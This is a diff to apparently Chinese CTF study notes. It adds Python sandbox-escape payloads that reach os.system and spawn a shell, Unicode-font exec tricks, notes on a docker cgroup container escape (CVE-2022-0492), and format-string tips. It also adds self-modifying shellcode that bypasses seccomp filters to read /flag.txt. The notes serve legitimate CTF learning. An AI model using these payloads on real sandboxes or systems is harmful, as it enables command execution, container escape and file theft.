@@ -306,9 +306,16 @@ int main() {
 𝔭𝔯𝔦𝔫𝔱("hello!")
 #hello!
 ```
-
-print函数可正常使用。
-
+print函数可正常使用。提供一个简单的普通字母转哥特字母脚本。
+```py
+import string,sys
+fake_alphabet = "𝔞 𝔟 𝔠 𝔡 𝔢 𝔣 𝔤 𝔥 𝔦 𝔧 𝔨 𝔩 𝔪 𝔫 𝔬 𝔭 𝔮 𝔯 𝔰 𝔱 𝔲 𝔳 𝔴 𝔵 𝔶 𝔷".split(" ")
+real_alphabet = string.ascii_lowercase
+trans = str.maketrans("".join(real_alphabet), "".join(fake_alphabet))
+code = sys.argv[1]
+converted_code = code.translate(trans)
+print(converted_code)
+```
 - `("a"*118).__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')`
   - 任意文件读取。来源:[Pycjail](../../CTF/LA%20CTF/Misc/Pycjail.md)（任意文件读取/RCE）。知识点：
     - LOAD_GLOBAL, LOAD_NAME, LOAD_METHOD和LOAD_ATTR是常用的加载可调用对象的opcode。
@@ -356,7 +363,12 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
 - `[ x.__init__.__globals__ for x in ().__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('cmd')`
 - `[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("cmd")`
 - `().__class__.__base__.__subclasses__()[141].__init__.__globals__["system"]("sh")`
-- `().__class__.__bases__[0].__subclasses__()[107]().load_module("os").system("cmd")`  
+- `().__class__.__bases__[0].__subclasses__()[107]().load_module("os").system("cmd")`
+- 奇怪字体系列：
+  - `ｅｘｅｃ('ｐｒｉｎｔ(ｏｐｅｎ(' + ｃｈｒ(34) + ｃｈｒ(102) + ｃｈｒ(108) + ｃｈｒ(97) + ｃｈｒ(103) + ｃｈｒ(46) + ｃｈｒ(116)+ｃｈｒ(120)+ｃｈｒ(116) + ｃｈｒ(34) + ')' + ｃｈｒ(46)+'ｒｅａｄ())')`
+  - `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()`
+  - `𝑒𝓍𝑒𝒸(𝒾𝓃𝓅𝓊𝓉())`
+  - `𝘦𝘹𝘦𝘤(𝘪𝘯𝘱𝘶𝘵())`
 
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 
@@ -786,3 +798,72 @@ xd在程序开始时会被calloc/malloc的指针覆盖，即使程序没有PIE�
 - wasm binary pwn。wasm可用不同高级语言写成，比如C/C++。字节溢出等问题也会在wasm里出现。
 - `$global0` is LLVM's RSP in wasm
 - [diswasm](https://github.com/wasmkit/diswasm),此工具擅长处理unminified style of wasm
+81. [Infernal Break](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#infernal-break)
+- 使用qemu挂载iso文件:`qemu-system-x86_64 -boot d -cdrom ctf.iso -m 2048 -cpu host -smp 2`。或开启KVM：`qemu-system-x86_64 -boot d -cdrom ctf.iso -m 2048 -cpu host -smp 2 --enable-kvm`
+- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)：linux相关提权脚本
+- 利用cgroup漏洞实现docker container escaption：[CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups)
+  - To exploit this vulnerability we need a cgroup where we can write in the release_agent file, and then trigger it’s invocation by killing all processes in that cgroup. An easy way to do that is to mount a cgroup controller and create a child cgroup within it.
+  - Another aspect to consider is the storage-driver used by Docker, which is typically overlayfs. It exposes the full host path of the mount point in /etc/mtab. If we do not find any relevant information here, we can assume that another storage-driver is being used. As explained [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/release_agent-exploit-relative-paths-to-pids) we can obtain the absolute path of the container on the host by bruteforcing the pids on the host.
+  - 漏洞利用的bash脚本在wp里
+82. [Sentence To Hell](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#sentence-to-hell)
+- 格式化字符串漏洞+任意地址写。一个PIE程序里有以下几个地址需要泄露：
+  - Stack address（程序记录返回地址的地方。如何获取函数的返回地址：在ret指令处下个断点，rsp处的stack地址即为返回地址存储的地方。同一个函数执行多次，每次的地址都不一样）
+  - code base（ghidra或ida里看到的指令加载时的基址，想要使用程序里的gadget或想挑战到程序里的指令段时泄露）
+  - libc address（使用libc里的函数或gadget（one gadget））
+- 除了将返回地址填为main函数可以获得第二次执行，也可以填为`_start`的。https://github.com/R3dSh3rl0ck/CTF-Competitions-Writeups/tree/main/DanteCTF_2023/sentence
+83. [Soulcode](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#soulcode)
+- 构造polymorphic open+read+write shellcode绕过seccomp沙盒+过滤。polymorphic shellcode的基本思路在于，先写出一段能满足要求的正常的shellcode，然后找到一个key使之前的shellcode与其异或后均不在blacklist里。发送给题目的shellcode为解码器，真正的shellcode藏在传给解码器的数据里
+  - 被过滤的`/x0f/x05`是syscall的字节码，借助polymorphic shellcode的思路，可以让shellcode在执行过程中自己构建出`\x0f\x05`
+  ```py
+  shellcode = """
+  .global _start
+  .intel_syntax noprefix
+  _start:
+      mov rax, 0x2
+      lea rdi, [rip+flag]
+      xor rsi, rsi
+      xor rdx, rdx
+      inc byte ptr [rip+syscall1+1]
+      inc byte ptr [rip + syscall1]
+
+  syscall1:
+      .byte 0x0e
+      .byte 0x04
+
+      mov rdi, rax
+      xor rax,rax
+      mov rsi, rsp
+      mov rdx, 0x40
+      inc byte ptr [rip + syscall2 + 1]
+      inc byte ptr [rip + syscall2]
+
+  syscall2:
+      .byte 0x0e
+      .byte 0x04
+
+      mov rax, 0x1
+      mov rdi, 0x1
+      inc byte ptr [rip + syscall3 + 1]
+      inc byte ptr [rip + syscall3]
+
+  syscall3:
+      .byte 0x0e
+      .byte 0x04
+  flag:
+      .string "flag.txt"
+  """
+  payload = asm(shellcode)
+  ```
+- 由于程序使用strpbrk函数检查输入是否含有黑名单byte，而该函数会在第一个null字节处停止。所以只需要保证shellcode中null字节之前的字节不在黑名单里就好了，后面的正常写。https://github.com/dmur1/ctf-writeups/blob/main/2023_06_03_dantectf_pwn_soulcode_writeup.md
+    - 在真正的shellcode面前铺垫多个null字节，然后直接jmp过去。
+```py
+jmpsc = asm("""
+    add rdx, 0x50
+    jmp rdx
+""")
+realsc = asm(shellcraft.open("/flag.txt"))
+realsc += asm(shellcraft.read('rax', 'rsp', 0x50))
+realsc += asm(shellcraft.write(1, 'rsp', 0x50))
+print(realsc)
+sc = jmpsc + b"\x00" * (0x50 - len(jmpsc)) + realsc
+ ```
